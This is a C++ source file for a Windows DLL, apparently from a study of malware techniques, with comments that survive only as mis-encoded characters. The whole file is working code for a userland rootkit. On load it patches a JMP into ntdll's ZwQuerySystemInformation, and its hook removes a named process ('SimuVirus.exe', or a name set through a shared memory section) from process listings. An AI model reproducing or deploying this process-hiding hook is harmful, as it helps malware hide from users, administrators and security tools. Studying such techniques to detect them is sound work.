// HiddenProc.cpp : ���� DLL Ӧ�ó���ĵ���������
//

#include "stdafx.h"
#include <Windows.h>
#include <tchar.h>

#define STATUS_SUCCESS (0x00000000L) 

typedef LONG NTSTATUS;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	BYTE Reserved1[48];
	PVOID Reserved2[3];
	HANDLE UniqueProcessId;
	PVOID Reserved3;
	ULONG HandleCount;
	BYTE Reserved4[4];
	PVOID Reserved5[11];
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved6[6];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI *PFZWQUERYSYSTEMINFORMATION)
(SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength);

#define DEF_NTDLL                       ("ntdll.dll")
#define DEF_ZWQUERYSYSTEMINFORMATION    ("ZwQuerySystemInformation")

//����һ������".SHARE"�Ĺ����ڴ������Ȼ�󴴽�g_szProcName������
//������ɵ�������SetprocName()��Ҫ���صĽ������Ʊ��浽g_szProcName��(SetProcName������RemoteMain.exe��ִ��)
#pragma comment(linker,"/SECTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
TCHAR g_szProcName[MAX_PATH] = { 0, };
#pragma data_seg()



BYTE g_pOrgBytes[5] = { 0, };



BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)
{
	FARPROC pfnOrg;
	DWORD dwOldProtect;
	DWORDLONG dwAddress;
	BYTE pBuf[5] = { 0xE9,0, };
	PBYTE pByte;

	//��ntdll.dll�е���ZwQuerySystemInformation
	pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pfnOrg;

	//���ZwQuerySystemInformation�Ѿ����޸ģ���return
	if (pByte[0] == 0xE9)
		return FALSE;

	//���ڴ��Ϊ�ɶ�д
	VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	//����ԭ������
	memcpy(pOrgBytes, pfnOrg, 5);

	//�µĺ�����ַ-HOOK������ַ-5(JMP XXXXXXXX���ֽ�)=���ƫ����
	dwAddress = (DWORDLONG)pfnNew - (DWORDLONG)pfnOrg - 5;

	//�����ƫ��������pBuf
	memcpy(&pBuf[1], &dwAddress, 4);

	//��pBuf(���޸ĺ�Ĵ���)д���ڴ棬���ڴ����Ѿ��޸ĳɹ���
	memcpy(pfnOrg, pBuf, 5);

	//�ָ��ڴ��ʼȨ��
	VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect);

	return TRUE;

}

BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgByte)
{
	FARPROC pFunc;
	DWORD dwOldProtect;
	PBYTE pByte;

	pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pFunc;

	if (pByte[0] != 0xE9)
		return FALSE;

	VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	//�����ݵ����ݻָ����ڴ�
	memcpy(pFunc, pOrgByte, 5);

	VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}


//������ʽ��ZwQuerySystemInformationһģһ��
NTSTATUS WINAPI NewZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength)
{
	NTSTATUS status;
	FARPROC pFunc;
	PSYSTEM_PROCESS_INFORMATION pCur, pPrev = NULL;
	char szProcName[MAX_PATH] = { 0, };

	//��ʼ֮ǰ���ѹ�
	unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);

	//ͨ��GetProcAddress����ԭʼAPI
	pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL), DEF_ZWQUERYSYSTEMINFORMATION);
	status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if (status != STATUS_SUCCESS)
		goto __NTQUERYSYSTEMINFORMATION_END;

	//�����SystemProcessInformation���Ͳ���
	if (SystemInformationClass == SystemProcessInformation)
	{
		//SYSTEM_PROCESS_INFORMATION����ת��
		//pCur�ǵ��������ͷ
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;


		//��ʼ��������
		while (TRUE)
		{

			if (pCur->Reserved2[1] != NULL)
			{
				//�ȽϽ��������Ƿ������ǵ�Ŀ�Ľ���
				//MessageBox(NULL, (PWSTR)pCur->Reserved2[1], (PWSTR)pCur->Reserved2[1], MB_OK);
				if (!_tcsicmp((PWSTR)pCur->Reserved2[1], g_szProcName))
				{
					//����ǣ��ж��Ƿ�λ������β��
					//���������β�����Ͱ�ǰһ���ڵ��Next��Ϊ0��ֱ�Ӷ�����Ŀ�Ľ��̵���Ϣ
					//�������β��������Ҫ����Ŀ�Ľ��̣���������ǰһ����Nextָ��Ŀ�Ľ��̵ĺ�һ�����̣�������ָ��Ŀ�Ľ���
					if (pCur->NextEntryOffset == 0)
						pPrev->NextEntryOffset = 0;
					else if(pPrev != NULL)
						pPrev->NextEntryOffset += pCur->NextEntryOffset;

				}
				else
					//����ǰһ���ڵ�
					pPrev = pCur;
			}

			//����������������˳�
			if (pCur->NextEntryOffset == 0)
				break;

			//���µ�ǰ�ڵ㣬�õ���һ���ڵ��λ��
			pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONGLONG)pCur + pCur->NextEntryOffset);
		}
	}
__NTQUERYSYSTEMINFORMATION_END:
	hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, (PROC)NewZwQuerySystemInformation, g_pOrgBytes);
	return status;
}



//DLL�����
BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		//����Hook
		//MessageBox(NULL, L"Hello", L"Hello", NULL);
		_tcscpy_s(g_szProcName, L"SimuVirus.exe");
		hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, (PROC)NewZwQuerySystemInformation, g_pOrgBytes);

		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		//ж��Hook
		unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);
		break;
	}
	return TRUE;
}
